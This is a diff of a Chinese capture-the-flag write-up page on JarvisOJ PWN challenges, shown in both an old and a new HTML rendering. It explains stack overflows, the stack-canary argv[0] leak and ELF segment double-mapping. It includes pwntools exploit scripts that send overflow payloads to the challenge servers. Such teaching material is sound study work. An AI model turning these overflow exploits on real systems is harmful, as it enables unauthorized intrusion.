+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;&gt; &quot;</span><span class="op">);</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>  __isoc99_scanf<span class="op">(</span><span class="st">&quot;%s&quot;</span><span class="op">,</span> <span class="op">&amp;</span>s<span class="op">);</span><span class="co">//溢出点</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>strncmp<span class="op">(&amp;</span>s<span class="op">,</span> s2<span class="op">,</span> <span class="dv">4</span><span class="bu">u</span><span class="op">)</span> <span class="op">)</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a>    result <span class="op">=</span> puts<span class="op">(</span><span class="st">&quot;good job!!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a>    result <span class="op">=</span> puts<span class="op">(</span><span class="st">&quot;cff flag is failed!!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>问题出在<code>mem_test()</code>函数的<code>scanf</code>上，查看栈结构很容易知道溢出填充长度为<code>23</code>。
+此外还有一个<code>win_func()</code>函数和一个<code>catFlag</code>只读数据</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-56-31.jpg"></p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> __cdecl win_func<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>command<span class="op">)</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> system<span class="op">(</span>command<span class="op">);</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>所以思路就很简单了。
+溢出跳过<code>win_func()</code>，然后栈上传个<code>catFlag</code>就好了</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./memory&quot;) </span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9876</span>)</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="dv">23</span></span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="bn">0x80485BD</span>)</span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>p32(<span class="bn">0x80487E0</span>)<span class="op">+</span>p32(<span class="bn">0x80487E0</span>)</span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;&gt; &quot;</span>,payload)</span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>Flag: CTF{332e294fb7aeeaf0e1c7703a29304343}</strong></p>
-<h1 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell me something"></a>Tell me something</h1><p>很简单的一题，一个溢出点一个<code>cat Flag</code>函数，不赘述</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./guestbook&quot;)
-pro = remote(&quot;pwn.jarvisoj.com&quot;, 9876)
-context.log_level = &#39;debug&#39;
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-payload = &quot;A&quot;*136
-payload += p64(0x400620)
-respone(&quot;Input your message:\n&quot;,payload)
-print pro.recv(500)
-</code></pre>
+<h1 id="tell-me-something">Tell me something</h1>
+<p>很简单的一题，一个溢出点一个<code>cat Flag</code>函数，不赘述</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./guestbook&quot;)</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn.jarvisoj.com&quot;</span>, <span class="dv">9876</span>)</span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="dv">136</span></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="bn">0x400620</span>)</span>
+<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input your message:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> pro.recv(<span class="dv">500</span>)</span></code></pre></div>
 <p><strong>Flag: PCTF{This_is_J4st_Begin}</strong></p>
-<h1 id="Smashes"><a href="#Smashes" class="headerlink" title="Smashes"></a>Smashes</h1><p>首先分析一下程序：</p>
-<pre><code class="lang-C">int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  __int64 v3; // rax@1
-  __int64 v4; // rbx@2
-  int v5; // eax@3
-  __int64 v8; // [sp+0h] [bp-128h]@1
-  __int64 v9; // [sp+108h] [bp-20h]@1
-
-  v9 = *MK_FP(__FS__, 40LL);
-  __printf_chk(1LL, 0x400934LL);                // print &quot;Hello!\nWhat&#39;s your name?&quot;
-  LODWORD(v3) = _IO_gets(&amp;v8);                  // Read
-  if ( !v3 )
-LABEL_9:
-    _exit(1);
-  v4 = 0LL;
-  __printf_chk(1LL, 0x400960LL);                // print Your name what you just input
-  while ( 1 )                                   // 读取输入，覆盖flag
-  {
-    v5 = _IO_getc(stdin);
-    if ( v5 == -1 )
-      goto LABEL_9;
-    if ( v5 == &#39;\n&#39; )
-      break;
-    byte_600D20[v4++] = v5;
-    if ( v4 == 32 )
-      goto LABEL_8;
-  }
-  memset((void *)((signed int)v4 + 0x600D20LL), 0, (unsigned int)(32 - v4));// 将flag清零
-LABEL_8:
-  puts(&quot;Thank you, bye!&quot;);
-  return *MK_FP(__FS__, 40LL) ^ v9;
-}
-</code></pre>
-<p>在程序<code>data</code>段的末尾<code>0x600D20</code>处有一句提示<code>PCTF{Here&#39;,27h,&#39;s the flag on server}</code>,提示我们flag就在此处，需要我们想办法获得，而程序后面会将flag置零</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-37-38.jpg" alt=""></p>
+<h1 id="smashes">Smashes</h1>
+<p>首先分析一下程序：</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> __cdecl main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>envp<span class="op">)</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>  __int64 v3<span class="op">;</span> <span class="co">// rax@1</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>  __int64 v4<span class="op">;</span> <span class="co">// rbx@2</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> v5<span class="op">;</span> <span class="co">// eax@3</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a>  __int64 v8<span class="op">;</span> <span class="co">// [sp+0h] [bp-128h]@1</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a>  __int64 v9<span class="op">;</span> <span class="co">// [sp+108h] [bp-20h]@1</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>  v9 <span class="op">=</span> <span class="op">*</span>MK_FP<span class="op">(</span>__FS__<span class="op">,</span> <span class="dv">40</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>  __printf_chk<span class="op">(</span><span class="dv">1</span><span class="bu">LL</span><span class="op">,</span> <span class="bn">0x400934</span><span class="bu">LL</span><span class="op">);</span>                <span class="co">// print &quot;Hello!\nWhat&#39;s your name?&quot;</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a>  LODWORD<span class="op">(</span>v3<span class="op">)</span> <span class="op">=</span> _IO_gets<span class="op">(&amp;</span>v8<span class="op">);</span>                  <span class="co">// Read</span></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>v3 <span class="op">)</span></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>LABEL_9<span class="op">:</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a>    _exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a>  v4 <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
+<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a>  __printf_chk<span class="op">(</span><span class="dv">1</span><span class="bu">LL</span><span class="op">,</span> <span class="bn">0x400960</span><span class="bu">LL</span><span class="op">);</span>                <span class="co">// print Your name what you just input</span></span>
+<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span> <span class="dv">1</span> <span class="op">)</span>                                   <span class="co">// 读取输入，覆盖flag</span></span>
+<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a>    v5 <span class="op">=</span> _IO_getc<span class="op">(</span>stdin<span class="op">);</span></span>
+<span id="cb23-20"><a href="#cb23-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> v5 <span class="op">==</span> <span class="op">-</span><span class="dv">1</span> <span class="op">)</span></span>
+<span id="cb23-21"><a href="#cb23-21" aria-hidden="true" tabindex="-1"></a>      <span class="cf">goto</span> LABEL_9<span class="op">;</span></span>
+<span id="cb23-22"><a href="#cb23-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> v5 <span class="op">==</span> <span class="ch">&#39;\n&#39;</span> <span class="op">)</span></span>
+<span id="cb23-23"><a href="#cb23-23" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb23-24"><a href="#cb23-24" aria-hidden="true" tabindex="-1"></a>    byte_600D20<span class="op">[</span>v4<span class="op">++]</span> <span class="op">=</span> v5<span class="op">;</span></span>
+<span id="cb23-25"><a href="#cb23-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> v4 <span class="op">==</span> <span class="dv">32</span> <span class="op">)</span></span>
+<span id="cb23-26"><a href="#cb23-26" aria-hidden="true" tabindex="-1"></a>      <span class="cf">goto</span> LABEL_8<span class="op">;</span></span>
+<span id="cb23-27"><a href="#cb23-27" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb23-28"><a href="#cb23-28" aria-hidden="true" tabindex="-1"></a>  memset<span class="op">((</span><span class="dt">void</span> <span class="op">*)((</span><span class="dt">signed</span> <span class="dt">int</span><span class="op">)</span>v4 <span class="op">+</span> <span class="bn">0x600D20</span><span class="bu">LL</span><span class="op">),</span> <span class="dv">0</span><span class="op">,</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)(</span><span class="dv">32</span> <span class="op">-</span> v4<span class="op">));</span><span class="co">// 将flag清零</span></span>
+<span id="cb23-29"><a href="#cb23-29" aria-hidden="true" tabindex="-1"></a>LABEL_8<span class="op">:</span></span>
+<span id="cb23-30"><a href="#cb23-30" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;Thank you, bye!&quot;</span><span class="op">);</span></span>
+<span id="cb23-31"><a href="#cb23-31" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="op">*</span>MK_FP<span class="op">(</span>__FS__<span class="op">,</span> <span class="dv">40</span><span class="bu">LL</span><span class="op">)</span> <span class="op">^</span> v9<span class="op">;</span></span>
+<span id="cb23-32"><a href="#cb23-32" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>在程序<code>data</code>段的末尾<code>0x600D20</code>处有一句提示<code>PCTF{Here',27h,'s the flag on server}</code>,提示我们flag就在此处，需要我们想办法获得，而程序后面会将flag置零</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-37-38.jpg"></p>
 <p>这题看似简单，但是需要知道两个知识点才能解决</p>
-<ol>
+<ol type="1">
 <li>Canary保护机制</li>
-<li>ELF文件段加载或者说内存映射关系 </li>
+<li>ELF文件段加载或者说内存映射关系</li>
 </ol>
-<h2 id="Canary保护机制"><a href="#Canary保护机制" class="headerlink" title="Canary保护机制"></a>Canary保护机制</h2><p>对于linux下的程序保护机制，我的上篇文章也有提及Canary保护。<br><code>Canary</code>，金丝雀。据说是以前矿工用金丝雀来确定地下气体是否有毒或者是否适合工作。。。但是这个名字的由来很好地跟我们解释了这个<code>Canary</code>的作用<br><code>Canary</code>位置如图：</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg" alt=""><br><code>Canary</code>是随机生成的一段数据。当我们想栈溢出的时候，填充的数据就会破坏<code>Canary</code>，当程序<code>Return</code>的时候就会检查<code>Canary</code>是否被破坏。如果被破坏了就会调用<code>___stack_chk_fail</code>中断程序，从而达到保护程序控制流不被修改的目的。而函数的原型如下:</p>
-<pre><code class="lang-C">void __attribute__ ((noreturn)) __stack_chk_fail (void)
-{
-  __fortify_fail (&quot;stack smashing detected&quot;);
-}
-void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
-{
- //神奇的注释
-  /* The loop is added only to keep gcc happy.  */
-  while (1)
-    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
-                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-}
-</code></pre>
-<p>大致意思就是会输入一段文字提示你程序炸了,然后这段文字里面包含一个我们感兴趣的参数<code>__libc_argv[0]</code>，这个是啥意思呢<br>咱们写C程序的<code>main</code>函数的时候完整写法应该是这样的:</p>
-<pre><code class="lang-C">int  main(int argc, const char **argv, const char **envp)
-</code></pre>
-<p>第一个<code>argc</code>参数是指你传入到<code>main</code>参数的个数，第二个参数<code>argv</code>,是一个指针的指针，类似于二维数组，其实可以理解为就是一个字符串数组<code>argv[0]</code>是程序路径，<code>argv[1]</code>起对应的是咱们传进<code>main</code>函数的一个个参数<br><strong><code>argv[0]</code>是存储在栈上的</strong>，所以我们可以将<code>argv[0]</code>的地址换成我们想要的地址，如<code>flag</code>地址，然后程序就会输出我们想要的内容了<br>但是话又说回来，虽然我们可以输出任意地址的字符串，但是我们的<code>flag</code>是被覆盖了啊。俗话说<code>巧妇难为无米之炊</code>。但是我们可以通过<code>linux</code>下elf文件加载进内存的一些特性来实现我们的构想</p>
-<h2 id="ELF文件段加载或者说内存映射关系"><a href="#ELF文件段加载或者说内存映射关系" class="headerlink" title="ELF文件段加载或者说内存映射关系"></a>ELF文件段加载或者说内存映射关系</h2><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/program_loading.html" target="_blank" rel="noopener">CTF-Wiki - 程序加载</a><br>文中有如下一段话：<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg" alt=""><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg" alt=""></p>
+<h2 id="canary保护机制">Canary保护机制</h2>
+<p>对于linux下的程序保护机制，我的上篇文章也有提及Canary保护。
+<code>Canary</code>，金丝雀。据说是以前矿工用金丝雀来确定地下气体是否有毒或者是否适合工作。。。但是这个名字的由来很好地跟我们解释了这个<code>Canary</code>的作用
+<code>Canary</code>位置如图：</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg">
+<code>Canary</code>是随机生成的一段数据。当我们想栈溢出的时候，填充的数据就会破坏<code>Canary</code>，当程序<code>Return</code>的时候就会检查<code>Canary</code>是否被破坏。如果被破坏了就会调用<code>___stack_chk_fail</code>中断程序，从而达到保护程序控制流不被修改的目的。而函数的原型如下:</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> __attribute__ <span class="op">((</span>noreturn<span class="op">))</span> __stack_chk_fail <span class="op">(</span><span class="dt">void</span><span class="op">)</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>  __fortify_fail <span class="op">(</span><span class="st">&quot;stack smashing detected&quot;</span><span class="op">);</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> __attribute__ <span class="op">((</span>noreturn<span class="op">))</span> internal_function __fortify_fail <span class="op">(</span><span class="dt">const</span> <span class="dt">char</span> <span class="op">*</span>msg<span class="op">)</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a> <span class="co">//神奇的注释</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* The loop is added only to keep gcc happy.  */</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>    __libc_message <span class="op">(</span><span class="dv">2</span><span class="op">,</span> <span class="st">&quot;*** %s ***: %s terminated</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>                    msg<span class="op">,</span> __libc_argv<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">?:</span> <span class="st">&quot;&lt;unknown&gt;&quot;</span><span class="op">);</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>大致意思就是会输入一段文字提示你程序炸了,然后这段文字里面包含一个我们感兴趣的参数<code>__libc_argv[0]</code>，这个是啥意思呢
+咱们写C程序的<code>main</code>函数的时候完整写法应该是这样的:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span>  main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>envp<span class="op">)</span></span></code></pre></div>
+<p>第一个<code>argc</code>参数是指你传入到<code>main</code>参数的个数，第二个参数<code>argv</code>,是一个指针的指针，类似于二维数组，其实可以理解为就是一个字符串数组<code>argv[0]</code>是程序路径，<code>argv[1]</code>起对应的是咱们传进<code>main</code>函数的一个个参数
+<strong><code>argv[0]</code>是存储在栈上的</strong>，所以我们可以将<code>argv[0]</code>的地址换成我们想要的地址，如<code>flag</code>地址，然后程序就会输出我们想要的内容了
+但是话又说回来，虽然我们可以输出任意地址的字符串，但是我们的<code>flag</code>是被覆盖了啊。俗话说<code>巧妇难为无米之炊</code>。但是我们可以通过<code>linux</code>下elf文件加载进内存的一些特性来实现我们的构想</p>
+<h2 id="elf文件段加载或者说内存映射关系">ELF文件段加载或者说内存映射关系</h2>
+<p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/program_loading.html" target="_blank" rel="noopener">CTF-Wiki
+- 程序加载</a> 文中有如下一段话： <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg"><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg"></p>
 <blockquote>
-<p>在这个例子中，尽管代码段和数据段在模4KB的意义下相等，但是仍然最多有4个页面包含有不纯的代码或者数据。当然，<strong>实际中会取决于页大小或者文件系统的块大小。</strong></p>
-<ul>
-<li>代码段的第一个页包含了ELF头，程序头部表，以及其他信息。</li>
-<li>代码段的最后一页包含了数据段开始部分的副本。</li>
-<li>数据段的第一页包含了代码段的最后部分的副本。至于多少，暂未说明。</li>
-<li>数据段的最后一部分可能会包含与程序运行无关的信息。</li>
-</ul>
-<p>逻辑上说，系统会对强制控制内存的权限，就好比每一个段的权限都是完全独立的；段的地址会被调整，以便于确保内存中的每一个逻辑页都只有一组类型的权限。在上面给出的例子中，<strong>文件的代码段的最后一部分和数据段的开始部分都会被映射两次：分别在数据段的虚拟地址以及代码段的虚拟地址。</strong><br>然后文件在内存中就会映射成这样子：</p>
+<p>在这个例子中，尽管代码段和数据段在模4KB的意义下相等，但是仍然最多有4个页面包含有不纯的代码或者数据。当然，<strong>实际中会取决于页大小或者文件系统的块大小。</strong>
++ 代码段的第一个页包含了ELF头，程序头部表，以及其他信息。 +
+代码段的最后一页包含了数据段开始部分的副本。 +
+数据段的第一页包含了代码段的最后部分的副本。至于多少，暂未说明。 +
+数据段的最后一部分可能会包含与程序运行无关的信息。</p>
 </blockquote>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg" alt=""><br>很清楚地看到，以4KB大小分割（linux64bit的默认页大小是0x1000Bytes）文件状态下的数据(代码也是数据),段与段之间会有重叠部分，而系统索性全部映射过来，所以<strong>代码段的最后一页包含了数据段开始部分的副本，而数据段的第一页包含了代码段的最后部分的副本。（如图）</strong><br>由于我们的文件很小，且通过<code>readelf</code>查看段的文件偏移全部小于0x1000<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg" alt=""><br>且前面几段映射的基址是<code>0x400000</code>,到后面的<code>.init_array</code>段的映射基址是<code>0x600000</code>故我们有理由断定，在内存里面会存在两份<code>.data</code>段和<code>.bss</code>段（其实其他段也会被映射两次）<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg" alt=""><br>接下来我们实际演示一下用gdb下断点调试，然后找<code>.rodata</code>段里面的数据在内存里面的位置来验证我们的猜想<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg" alt=""><br>首先随便下个断点，让程序装载就好了<br>然后我们寻找<code>.rodata</code>段里面的数据<code>&quot;Thank you, bye!&quot;</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg" alt=""><br>果不其然，位于地址<code>0x40094E</code>的数据 <code>&quot;Thank you, bye!&quot;</code>在内存里面被映射了两次。<br>既然我们猜想实现，那么我们来尝试寻找在<code>.data</code>段里面的<code>PCTF{</code><br>这次我们把断点定在<code>0x40080B</code>处，为的是不让下面的函数将<code>PCTF{</code>破坏掉<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg" alt=""><br>同样的，我们在内存中(或者说是程序虚拟空间中)找到了两处<code>PCTF{</code>的映射<br>所以就算地址<code>0x600D20</code>处的flag被破坏，我们也能在另外一处即地址<code>0x400D20</code>找到一模一样的flag备份<br>那么结合我们上面说的用溢出点覆盖栈上的字符串地址<code>argv[0]</code>,然后利Canary被破坏的机制触发<code>___stack_chk_fail</code>函数将flag输出出来<br>我们首先得找一下溢出点到<code>argv[0]</code>的偏移<br>我们的溢出点，很容易发现在黄色高亮的代码处<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg" alt=""><br>然后我们设置两个断点，一个是在<code>0x4007E0</code>即<code>main</code>函数刚开始的传参完毕的地方，第二个是我们溢出点后<code>0x400813</code>处<br>首先我们用gdb运行程序来到了第一个断点<code>0x4007E0</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg" alt=""><br>可以看到<code>char ** argv</code>的值在栈地址<code>0x7fffffffdfa8</code>处，而真正的字符串数组地址是<code>0x7fffffffe078</code><br>然后我们在”name?”后面随便输入了个字符串”test”,然后来到第二个断点<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg" alt=""><br>得到我们溢出buff的地址在<code>0x7fffffffde60</code><br>所以我们将地址一相减就会得到数据填充偏移<code>0x7fffffffde60-0x7fffffffe078=536</code><br>所以我们这样构造poc:</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./smashes&quot;)
-pro = remote(&quot;pwn.jarvisoj.com&quot;, 9877)
-context.log_level = &#39;debug&#39;
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-payload = &quot;A&quot;*536
-payload += p64(0x400d20)
-respone(&quot;name?&quot;,payload)
-respone(&quot;flag:&quot;,&quot;What ever you want&quot;)
-pro.interactive()
-</code></pre>
-<p>简短的几句，然后就大功告成了。虽然代码很短，但是里面包含着很多知识点<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg" alt=""><br><strong>Flag: PCTF{57dErr_Smasher_good_work!}</strong></p>
+<blockquote>
+<p>逻辑上说，系统会对强制控制内存的权限，就好比每一个段的权限都是完全独立的；段的地址会被调整，以便于确保内存中的每一个逻辑页都只有一组类型的权限。在上面给出的例子中，<strong>文件的代码段的最后一部分和数据段的开始部分都会被映射两次：分别在数据段的虚拟地址以及代码段的虚拟地址。</strong>
